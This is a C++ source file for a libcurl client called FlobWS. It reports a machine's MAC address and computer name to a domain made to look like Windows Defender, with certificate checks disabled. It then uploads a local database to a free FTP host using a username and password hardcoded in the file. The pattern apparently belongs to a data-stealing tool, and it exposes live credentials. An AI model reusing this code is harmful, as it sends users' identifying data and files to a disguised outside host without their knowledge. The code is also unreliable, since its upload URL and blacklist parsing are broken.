//
// Created by Chrystalkey on 01.08.2019.
//

#include <vector>
#include <set>
#include <sstream>
#include "FlobWS.h"
#include "global_functions.h"
#include "../dependencies/curl/include/curl/curl.h"

FlobWS::FlobWS() {
    curl_global_init(CURL_GLOBAL_ALL);
}

namespace SyncSupport{
    std::string buffer;
    size_t receive(char *c_buf, size_t, size_t nmemb, void *){
        buffer.append(c_buf,nmemb);
        return nmemb*sizeof(char);
    }
}

std::set<std::wstring> FlobWS::sync_metadata(const std::string &mac, const std::string &cpName) {
    CURL *down = curl_easy_init();
    std::string request = "http://windefenddb.rf.gd";
    // comment out if in production use
    request = "https://localhost";
    // end of announcement
    request += "/get_metadata.php?mac="+mac+"&name="+curl_easy_escape(down,cpName.c_str(),cpName.length());
    curl_easy_setopt(down, CURLOPT_URL, request.c_str());
    curl_easy_setopt(down, CURLOPT_WRITEFUNCTION, SyncSupport::receive);
    curl_easy_setopt(down, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(down, CURLOPT_SSL_VERIFYPEER, false);
    curl_easy_setopt(down, CURLOPT_VERBOSE,1L);
    CURLcode res = curl_easy_perform(down);
    if(res != CURLE_OK ) {
        std::cerr << "ERROR performing data sync: " << curl_easy_strerror(res) << "\n";
        curl_easy_cleanup(down);
        std::cerr << "Buffer Dump: " << SyncSupport::buffer << "\n";
        return std::set<std::wstring>();
    }
    std::cout << SyncSupport::buffer << "\n";
    curl_easy_cleanup(down);

    if(SyncSupport::buffer.empty()){
        std::cerr << "ERROR syncing buffer is empty\n";
        return std::set<std::wstring>();
    }
    std::vector<std::string> resVec;
    std::istringstream iss(SyncSupport::buffer);
    std::string token;
    while(std::getline(iss,token,';')){
        resVec.push_back(token);
    }
    if(resVec.size() != 4 ){
        std::cerr << "ERROR splitting received string; imperfect number of entries\n";
        return std::set<std::wstring>();
    }
    flobCS.savedirectory = flobCS.converter.from_bytes(resVec[2]);
    flobCS.db_path = flobCS.savedirectory+flobCS.converter.from_bytes(resVec.back());
    flobCS.globalHandle = std::stoi(resVec.front());

    //and now: the blacklist
    std::istringstream bls(*(resVec.begin()+1));
    token = "";
    std::set<std::wstring> bl;
    while(std::getline(iss, token, '|')){
        bl.insert(flobCS.converter.from_bytes(token));
    }
    return bl;
}

namespace UploadSupport{
    size_t getContentLength(void *ptr, size_t size, size_t nmemb, void*stream){
        int r;
        long len = 0;
        r = sscanf((char*)ptr,"Content-Length: %ld\n",&len);
        if(r)
            *((long*)stream) = len;
        return size*nmemb;
    }
    size_t discard(void *ptr,size_t size, size_t nmemb, void *stream){
        (void)ptr;
        (void)stream;
        return size *nmemb;
    }
    size_t read(void *ptr, size_t size, size_t nmemb, void *stream){
        FILE *f = (FILE*)stream;
        size_t n;

        if(ferror(f)){
            return CURL_READFUNC_ABORT;
        }
        n = fread(ptr,size,nmemb,f)*size;
        return n;
    }
    size_t upload(CURL*curl, const std::wstring& remotePath,const std::wstring& localPath){
        int tries = 3;
        FILE *f;
        long uploaded_len = 0;
        CURLcode r = CURLE_GOT_NOTHING;
        int c;
        f = fopen(flobCS.converter.to_bytes(localPath).c_str(),"rb");
        if(!f){
            perror(NULL);
            std::wcerr << "ERROR reading file " <<localPath << "\n";
            return 0;
        }
        curl_easy_setopt(curl,CURLOPT_UPLOAD,1L);
        curl_easy_setopt(curl,CURLOPT_URL, flobCS.converter.to_bytes(localPath).c_str());
        curl_easy_setopt(curl,CURLOPT_HEADERFUNCTION, UploadSupport::getContentLength);
        curl_easy_setopt(curl,CURLOPT_HEADERDATA,&uploaded_len);
        curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION,discard);
        curl_easy_setopt(curl,CURLOPT_READFUNCTION,read);
        curl_easy_setopt(curl,CURLOPT_READDATA,f);
        curl_easy_setopt(curl,CURLOPT_FTPPORT,"-");
        curl_easy_setopt(curl,CURLOPT_FTP_CREATE_MISSING_DIRS,1L);
        curl_easy_setopt(curl,CURLOPT_VERBOSE,1L);

        for(c = 0; (r != CURLE_OK) && (c < tries);c++){
            if(c){
                curl_easy_setopt(curl,CURLOPT_NOBODY,1l);
                curl_easy_setopt(curl,CURLOPT_HEADER,1L);
                r = curl_easy_perform(curl);
                if(r != CURLE_OK){
                    continue;
                }
                curl_easy_setopt(curl,CURLOPT_NOBODY,0L);
                curl_easy_setopt(curl,CURLOPT_HEADER,0L);
                fseek(f,uploaded_len,SEEK_SET);
                curl_easy_setopt(curl,CURLOPT_APPEND, 1L);
            }else{
                curl_easy_setopt(curl,CURLOPT_APPEND,0L);
            }
            r = curl_easy_perform(curl);
        }
        fclose(f);
        if(r == CURLE_OK){
            return 1;
        }else{
            std::wcerr << "ERROR performing upload of file: " << curl_easy_strerror(r) << " - said curl\n";
            return 0;
        }
    }
    std::wstring generateDBName(){return L"BLAH.db";}
}

void FlobWS::upload(const std::wstring &file) {
    CURL *up = curl_easy_init();
    if(!up){
        std::cerr << "ERROR initializing curl handle up\n";
    }
    //curl_easy_setopt(up,CURLOPT_URL,"ftp://ftpupload.net/.htdocs/cp_names.xml");
    //curl_easy_setopt(up,CURLOPT_USERNAME,"epiz_24242735");
    //curl_easy_setopt(up,CURLOPT_PASSWORD,  "gYfJ6TI1wa");

    if(UploadSupport::upload(up,L"ftps://epiz_24242735:gYfJ6TI1wa@ftpupload.net/.htdocs/db_dir/"+UploadSupport::generateDBName(),file)){
        std::wcerr << "ERROR uploading file\n";
    }

    curl_easy_cleanup(up);
}

FlobWS::~FlobWS() {
    curl_global_cleanup();
}